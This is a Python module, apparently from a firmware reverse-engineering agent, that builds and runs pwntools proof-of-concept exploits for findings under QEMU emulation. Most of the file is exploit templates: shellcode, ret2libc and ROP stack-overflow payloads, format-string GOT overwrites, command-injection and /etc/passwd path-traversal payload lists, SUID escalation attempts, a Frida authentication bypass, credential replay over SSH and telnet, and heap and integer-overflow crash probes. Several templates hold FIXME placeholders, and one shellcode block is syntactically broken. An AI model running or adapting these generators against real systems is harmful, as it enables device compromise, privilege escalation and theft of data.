"""
Stage 4a — Automatic PoC construction and execution.

Builds pwntools exploit scripts from Stage 3 primitives and runs them
in emulation. Returns status: confirmed / plausible.
"""

import os
import re
import subprocess
import tempfile
from typing import Optional

from models import Finding


def build_poc(finding: Finding, triage, poc_dir: str) -> Optional[dict]:
    """
    Build and run a PoC for the finding.

    Returns dict with:
      script   : str  — full PoC source
      output   : str  — stdout from run
      confirmed: bool — True if expected artifact produced
      shell    : bool — True if shell was obtained
      controlled_pc: bool
      info_leak: bool
    """
    vuln_class = _classify_finding(finding)

    # Extract offset from emulation_trace if available
    offset = _extract_offset(finding.emulation_trace)

    script = _build_script(finding, triage, vuln_class, offset)
    if not script:
        return None

    # Write and run the script
    output, confirmed, shell, ctrl_pc, info_leak = _execute_poc(
        script, finding, triage, vuln_class, poc_dir,
    )

    return {
        "script":       script,
        "output":       output,
        "confirmed":    confirmed,
        "shell":        shell,
        "controlled_pc": ctrl_pc,
        "info_leak":    info_leak,
    }


def _classify_finding(f: Finding) -> str:
    title = f.title.lower()
    ev    = f.evidence.lower()
    if "format string" in title or "fmt" in title:
        return "format_string"
    if "command injection" in title or "cmd" in title:
        return "command_injection"
    if "hardcoded credential" in title or "cwe-798" in f.cwe.lower():
        return "hardcoded_cred"
    if "auth bypass" in title or "cwe-287" in f.cwe.lower():
        return "auth_bypass"
    if "heap overflow" in title or "heap" in title:
        return "heap_overflow"
    if "overflow" in title or "strcpy" in title or "gets" in title:
        return "stack_overflow"
    if "path traversal" in title:
        return "path_traversal"
    if "suid" in title:
        return "suid"
    if "crypto" in title and ("key" in title or "reuse" in title or "hardcoded" in title):
        return "crypto_key_reuse"
    if "integer overflow" in title or "integer wrap" in title or "cwe-190" in f.cwe.lower():
        return "integer_overflow"
    return "generic"


def _extract_offset(trace: str) -> int:
    """Parse offset from GDB cyclic / emulation_trace string."""
    m = re.search(r"offset[=:\s]+(\d+)", trace, re.IGNORECASE)
    if m:
        return int(m.group(1))
    return 0


def _extract_crash_addr(trace: str) -> str:
    m = re.search(r"(?:PC|EIP|RIP)[=:\s]+(0x[0-9a-fA-F]+)", trace, re.IGNORECASE)
    return m.group(1) if m else "0x41414141"


def _build_script(finding: Finding, triage, vuln_class: str, offset: int) -> str:
    path = finding.component.split(":")[-1] if ":" in finding.component else finding.component
    qemu_bin = _qemu_bin(triage.arch)
    sysroot  = f"-L {triage.extracted_path}" if triage.extracted_path else ""

    if vuln_class == "stack_overflow":
        return _stack_overflow_script(finding, triage, offset, path, qemu_bin, sysroot)
    if vuln_class == "format_string":
        return _format_string_script(finding, triage, path, qemu_bin, sysroot)
    if vuln_class == "command_injection":
        return _command_injection_script(finding, triage, path, qemu_bin, sysroot)
    if vuln_class == "hardcoded_cred":
        return _hardcoded_cred_script(finding, triage)
    if vuln_class == "auth_bypass":
        return _auth_bypass_script(finding, triage, path, qemu_bin, sysroot)
    if vuln_class == "path_traversal":
        return _path_traversal_script(finding, triage)
    if vuln_class == "suid":
        return _suid_script(finding, triage, path)
    if vuln_class == "heap_overflow":
        return _heap_overflow_script(finding, triage, path, qemu_bin, sysroot)
    if vuln_class == "crypto_key_reuse":
        return _crypto_key_reuse_script(finding, triage)
    if vuln_class == "integer_overflow":
        return _integer_overflow_script(finding, triage, path, qemu_bin, sysroot)
    return ""


def _stack_overflow_script(f: Finding, triage, offset: int, path: str,
                            qemu_bin: str, sysroot: str) -> str:
    offset_str = str(offset) if offset > 0 else "# FIXME: measure offset with GDB cyclic"
    nx = triage.mitigations.get("nx", True)
    pie = triage.mitigations.get("pie", True)

    if not nx:
        exploit_block = _shellcode_exploit(offset, triage.arch)
    elif not pie:
        exploit_block = _ret2libc_exploit(offset)
    else:
        exploit_block = _rop_exploit(offset)

    return f"""#!/usr/bin/env python3
# [re_agent] Auto-generated PoC: Stack Buffer Overflow
# Finding : {f.id} — {f.title}
# CWE     : {f.cwe}
# Target  : {path}
# Function: {f.function_name or '?'}
# Address : {f.address or '?'}
#
# Usage: python3 {f.id}.py [--target PATH] [--shell]
#
# Requirements: pwntools
#   pip install pwntools

import argparse
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("--target", default={repr(path)})
parser.add_argument("--shell", action="store_true")
parser.add_argument("--qemu", default={repr(qemu_bin)})
parser.add_argument("--sysroot", default={repr(triage.extracted_path or "")})
args = parser.parse_args()

context.arch = {repr(triage.arch)}
context.bits = {int(triage.bits)}
context.endian = {repr(triage.endian)}
context.log_level = "info"

elf = ELF(args.target, checksec=False)
offset = {offset_str}

{exploit_block}

try:
    if args.sysroot:
        p = process([args.qemu, "-L", args.sysroot, args.target])
    else:
        p = process([args.qemu, args.target]) if args.qemu else process([args.target])
    p.sendline(payload)
    output = p.recvall(timeout=5)
    print("[*] Output:", output[:200])
    if b"uid=" in output or b"$" in output:
        print("[+] SUCCESS: shell / command output obtained")
    elif p.returncode not in (0, None):
        print(f"[+] CRASH confirmed (rc={{p.returncode}})")
    else:
        print("[-] No shell — increase offset or adjust ROP chain")
    # STOP: requires real device from here if QEMU environment missing
except Exception as e:
    print(f"[!] Error: {{e}}")
"""


def _shellcode_exploit(offset: int, arch: str) -> str:
    return f"""
# NX disabled — shellcode injection
from pwn import shellcraft, asm
shellcode = asm(shellcraft.sh())
if offset > 0:
    payload = cyclic(offset) + p32(# FIXME: address of shellcode buffer)
    payload = cyclic(offset) if offset > len(shellcode) else shellcode.ljust(offset, b'A')
    payload += p32(# FIXME: ret-to-stack addr)
else:
    payload = shellcode + b'A' * 200  # probe — adjust size
print(f"[*] Sending {{len(payload)}}-byte shellcode payload")
"""


def _ret2libc_exploit(offset: int) -> str:
    off = offset if offset > 0 else 112
    return f"""
# No PIE — ret2libc
libc = ELF("/lib/arm-linux-gnueabi/libc.so.6", checksec=False)
system_addr = libc.sym["system"]
bin_sh_addr = next(libc.search(b"/bin/sh"))
payload  = cyclic({off})
payload += p32(system_addr)   # return to system()
payload += p32(0)             # fake return address for system()
payload += p32(bin_sh_addr)   # "/bin/sh" argument
print(f"[*] system={{hex(system_addr)}} /bin/sh={{hex(bin_sh_addr)}}")
print(f"[*] Sending {{len(payload)}}-byte ret2libc payload")
"""


def _rop_exploit(offset: int) -> str:
    off = offset if offset > 0 else 112
    return f"""
# PIE + NX — ROP chain
# Requires ROPgadget: pip install ropgadget
import subprocess, json
gadget_out = subprocess.check_output(
    ["ROPgadget", "--binary", args.target, "--rop", "--json"], text=True
)
gadgets = {{g["vaddr"]: g["opcodes"] for g in json.loads(gadget_out)["gadgets"]}}
# FIXME: select appropriate gadgets for target arch
print("[*] ROP gadgets loaded:", len(gadgets))
payload = cyclic({off})
payload += p32(0xDEADBEEF)  # FIXME: first ROP gadget
print(f"[*] Sending {{len(payload)}}-byte ROP payload")
"""


def _format_string_script(f: Finding, triage, path: str,
                           qemu_bin: str, sysroot: str) -> str:
    return f"""#!/usr/bin/env python3
# [re_agent] Auto-generated PoC: Format String
# Finding : {f.id} — {f.title}
# CWE     : {f.cwe}

from pwn import *

context.arch = {repr(triage.arch)}
elf = ELF({repr(path)}, checksec=False)

# Step 1: Leak address with %p chain
leak_payload = b"%p." * 20
print("[*] Sending leak payload:", leak_payload)

# Step 2: Overwrite GOT entry with %n
# Target: elf.got["exit"] → system()
# FIXME: calculate %n offset from above leak
write_payload = fmtstr_payload(offset=7, writes={{elf.got.get("exit", 0): elf.plt.get("system", 0)}})
print("[*] Write payload:", write_payload[:80])

p = process([{repr(qemu_bin)}, {repr(path)}]) if {repr(qemu_bin)} else process([{repr(path)}])
p.sendline(leak_payload)
output = p.recvall(timeout=3)
print("[*] Leak output:", output[:200])
if b"0x" in output:
    print("[+] Address leak confirmed")
else:
    print("[-] No leak — check format string offset")
# STOP: requires real device from here if QEMU missing
"""


def _command_injection_script(f: Finding, triage, path: str,
                               qemu_bin: str, sysroot: str) -> str:
    return f"""#!/usr/bin/env python3
# [re_agent] Auto-generated PoC: Command Injection
# Finding : {f.id} — {f.title}
# CWE     : {f.cwe}

import subprocess, sys

PAYLOADS = [
    b"; id",
    b"| id",
    b"$(id)",
    b"`id`",
    b"& id &",
    b"; id;",
]

target = {repr(path)}
for payload in PAYLOADS:
    try:
        result = subprocess.run(
            [target, payload.decode(errors="replace")],
            capture_output=True, timeout=5,
        )
        out = (result.stdout + result.stderr).decode(errors="replace")
        if "uid=" in out:
            print(f"[+] CONFIRMED: command injection with payload: {{payload}}")
            print(f"    Output: {{out[:200]}}")
            sys.exit(0)
    except Exception as e:
        print(f"[-] Payload {{payload}} failed: {{e}}")

print("[-] No command injection confirmed")
# STOP: requires real device from here
"""


def _hardcoded_cred_script(f: Finding, triage) -> str:
    # Extract credential from evidence
    cred_re = re.search(r"Hardcoded credential: (.+)", f.title)
    cred_type = cred_re.group(1) if cred_re else "credential"
    ev = f.evidence[:200]
    return f"""#!/usr/bin/env python3
# [re_agent] Auto-generated PoC: Hardcoded Credential Replay
# Finding : {f.id} — {f.title}
# CWE     : {f.cwe}
# Evidence: {ev}

import subprocess, sys

# FIXME: extract exact credential value from binary:
# strings <binary> | grep -i '{cred_type}'
CREDENTIAL = "FIXME_extract_from_binary"
TARGETS = [
    ("ssh",    22,  lambda c: ["ssh", "-o", "StrictHostKeyChecking=no",
                               f"{{c}}@target"]),
    ("telnet", 23,  lambda c: ["telnet", "target"]),
]

print(f"[*] Attempting credential replay: {cred_type}={{CREDENTIAL}}")
print("[*] Test against SSH, Telnet, HTTP Basic on target device")
print("[!] STOP: requires real device / network access from here")
"""


def _auth_bypass_script(f: Finding, triage, path: str,
                         qemu_bin: str, sysroot: str) -> str:
    addr = f.address or "0x0"
    fn   = f.function_name or "auth_check"
    return f"""#!/usr/bin/env python3
# [re_agent] Auto-generated PoC: Auth Bypass via Frida
# Finding : {f.id} — {f.title}
# CWE     : {f.cwe}
# Function: {fn} @ {addr}

# Requirements: frida-tools  (pip install frida-tools)

import frida, sys

FRIDA_SCRIPT = \"\"\"
Interceptor.attach(ptr('{addr}'), {{
    onLeave: function(retval) {{
        console.log('[frida] {fn} original return: ' + retval);
        retval.replace(ptr(1));
        console.log('[frida] {fn} patched -> 1 (bypass)');
    }}
}});
\"\"\"

def on_message(message, data):
    print("[frida]", message)

print(f"[*] Attaching Frida to process running {path}")
print(f"[*] Will patch return value of {fn}() at {addr} to 1")
print("[!] Start the target process first: qemu-arm -L <sysroot> {path}")
print("[!] Then run this script")

try:
    session = frida.attach({repr(fn)})  # attach by process name
    script = session.create_script(FRIDA_SCRIPT)
    script.on("message", on_message)
    script.load()
    print("[+] Frida script loaded. Trigger auth check in target.")
    sys.stdin.read()
except frida.ProcessNotFoundError:
    print("[!] Process not found — start the target first")
# STOP: requires live process (QEMU or real device) from here
"""


def _path_traversal_script(f: Finding, triage) -> str:
    return f"""#!/usr/bin/env python3
# [re_agent] Auto-generated PoC: Path Traversal
# Finding : {f.id} — {f.title}
# CWE     : {f.cwe}

import urllib.request, sys

TARGET = "http://target:80"
PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

for p in PAYLOADS:
    url = f"{{TARGET}}/{{p}}"
    try:
        resp = urllib.request.urlopen(url, timeout=5)
        body = resp.read(1000).decode(errors="replace")
        if "root:" in body:
            print(f"[+] CONFIRMED path traversal: {{url}}")
            print(f"    Content: {{body[:200]}}")
            sys.exit(0)
    except Exception as e:
        print(f"[-] {{url}}: {{e}}")
print("[-] No path traversal confirmed")
# STOP: requires real device / network from here
"""


def _suid_script(f: Finding, triage, path: str) -> str:
    return f"""#!/usr/bin/env python3
# [re_agent] Auto-generated PoC: SUID Privilege Escalation
# Finding : {f.id} — {f.title}
# CWE     : {f.cwe}
# Binary  : {path}

import subprocess, sys

# Attempt common SUID exploitation techniques
attempts = [
    [path, "--help"],                          # banner / version
    [path, "-c", "id"],                        # -c command execution
    [path, "--exec", "id"],                    # --exec parameter
]

for cmd in attempts:
    try:
        result = subprocess.run(cmd, capture_output=True, timeout=5)
        out = (result.stdout + result.stderr).decode(errors="replace")
        if "uid=0" in out or "root" in out:
            print(f"[+] CONFIRMED: SUID escalation via {{cmd}}")
            print(f"    Output: {{out[:200]}}")
            sys.exit(0)
    except Exception:
        pass

print("[-] Simple SUID escalation not confirmed")
print("[!] Manual review required: strings + ltrace + strace on SUID binary")
# STOP: requires real device from here
"""


def _execute_poc(script: str, finding: Finding, triage, vuln_class: str,
                 poc_dir: str) -> tuple:
    """Write script to temp file and execute it. Return (output, confirmed, shell, ctrl_pc, info_leak)."""
    script_path = tempfile.mktemp(suffix=".py", dir=poc_dir)
    try:
        with open(script_path, "w") as fh:
            fh.write(script)

        result = subprocess.run(
            ["python3", script_path],
            capture_output=True, timeout=30,
        )
        output = (result.stdout + result.stderr).decode(errors="replace")

        confirmed  = "SUCCESS" in output or "CONFIRMED" in output
        shell      = "uid=" in output
        ctrl_pc    = "controlled" in output.lower() or "hijack" in output.lower()
        info_leak  = "0x" in output and "leak" in output.lower()

        return output, confirmed or shell, shell, ctrl_pc, info_leak

    except subprocess.TimeoutExpired:
        return "[timeout — PoC ran too long]", False, False, False, False
    except Exception as exc:
        return f"[PoC execution error: {exc}]", False, False, False, False
    finally:
        try:
            os.unlink(script_path)
        except Exception:
            pass


def _qemu_bin(arch: str) -> str:
    return {"arm": "qemu-arm", "arm64": "qemu-aarch64", "mips": "qemu-mips",
            "x86": "qemu-i386", "x86_64": "qemu-x86_64"}.get(arch, "qemu-arm")


# ── Gap 15: New PoC script builders ───────────────────────────────────────────

def _heap_overflow_script(f: Finding, triage, path: str,
                           qemu_bin: str, sysroot: str) -> str:
    return f"""#!/usr/bin/env python3
# [re_agent] Auto-generated PoC: Heap Buffer Overflow
# Finding : {f.id} — {f.title}
# CWE     : {f.cwe}
# Target  : {path}
# Function: {f.function_name or '?'}
# Address : {f.address or '?'}
# NOTE    : Heap layout is allocator-dependent; this script measures crash only.

import subprocess, sys

QEMU   = "{qemu_bin}"
SYSROOT = ["{sysroot}"] if "{sysroot}" else []
TARGET  = "{path}"

# Try progressively larger allocations to trigger heap overflow
for size in [256, 512, 1024, 2048, 4096]:
    payload = b"\\x41" * size + b"\\x42\\x42\\x42\\x42"  # corrupt next chunk header
    cmd = [QEMU] + SYSROOT + [TARGET]
    r = subprocess.run(cmd, input=payload, capture_output=True, timeout=15)
    out = (r.stdout + r.stderr).decode(errors="replace")
    if r.returncode in (-6, -11, 134, 139) or "SIGABRT" in out or "free(): invalid" in out:
        print(f"[+] HEAP CRASH at payload size={{size}}: rc={{r.returncode}}")
        print(out[:500])
        print("[+] SUCCESS — heap overflow confirmed")
        sys.exit(0)
    print(f"[-] No crash at size={{size}}")

print("[-] No heap overflow detected at tested sizes")
print("[~] Try with heap spray or specific allocator grooming on real device")
"""


def _crypto_key_reuse_script(f: Finding, triage) -> str:
    key_hint = ""
    if f.evidence:
        import re as _re
        m = _re.search(r"(?:key|IV|nonce)[:\\s=]+([0-9a-fA-F]{{16,}})", f.evidence, _re.IGNORECASE)
        if m:
            key_hint = m.group(1)
    return f"""#!/usr/bin/env python3
# [re_agent] Auto-generated PoC: Hardcoded / Reused Crypto Key
# Finding : {f.id} — {f.title}
# CWE     : {f.cwe}
# Evidence: {f.evidence[:200]}

# Extracted key material (from static analysis):
HARDCODED_KEY = bytes.fromhex("{key_hint}") if "{key_hint}" else b"\\x00" * 16  # replace with actual key

print("[*] Hardcoded key material:")
print(f"    Key  : {{HARDCODED_KEY.hex()}}")
print(f"    Len  : {{len(HARDCODED_KEY)}} bytes")
print()
print("[*] Testing AES-CBC decryption with extracted key...")
try:
    from Crypto.Cipher import AES
    # Placeholder ciphertext — replace with captured network traffic
    ct = b"\\x00" * 32
    iv = b"\\x00" * 16
    cipher = AES.new(HARDCODED_KEY[:16], AES.MODE_CBC, iv)
    pt = cipher.decrypt(ct)
    print(f"[+] Decrypted: {{pt.hex()}}")
    print("[+] SUCCESS — hardcoded key usable for offline decryption")
except ImportError:
    print("[~] pycryptodome not installed: pip install pycryptodome")
except Exception as e:
    print(f"[-] Decryption failed: {{e}}")
"""


def _integer_overflow_script(f: Finding, triage, path: str,
                              qemu_bin: str, sysroot: str) -> str:
    return f"""#!/usr/bin/env python3
# [re_agent] Auto-generated PoC: Integer Overflow / Wrap
# Finding : {f.id} — {f.title}
# CWE     : {f.cwe}
# Target  : {path}
# Function: {f.function_name or '?'}
# Strategy: Trigger size wrap via crafted length field, then overflow resulting buffer

import subprocess, struct, sys

QEMU    = "{qemu_bin}"
SYSROOT = ["{sysroot}"] if "{sysroot}" else []
TARGET  = "{path}"

# Craft inputs with max-value length fields that wrap to 0 or small values
test_lengths = [
    0xFFFFFFFF,   # 32-bit max — wraps to 0 on +1
    0xFFFF,       # 16-bit max
    0x80000000,   # signed wrap
    0xFFFFFFFE,   # max-1 → allocates 0 bytes after +2
]

for length_val in test_lengths:
    # Little-endian 4-byte length prefix followed by payload
    payload = struct.pack("<I", length_val) + b"\\x41" * 64
    cmd = [QEMU] + SYSROOT + [TARGET]
    r = subprocess.run(cmd, input=payload, capture_output=True, timeout=15)
    out = (r.stdout + r.stderr).decode(errors="replace")
    if r.returncode in (-6, -11, 134, 139) or "SIGSEGV" in out or "SIGABRT" in out:
        print(f"[+] CRASH with length=0x{{length_val:08X}}: rc={{r.returncode}}")
        print(out[:500])
        print("[+] SUCCESS — integer overflow triggered")
        sys.exit(0)
    print(f"[-] No crash at length=0x{{length_val:08X}}")

print("[-] No integer overflow crash at tested boundary values")
"""
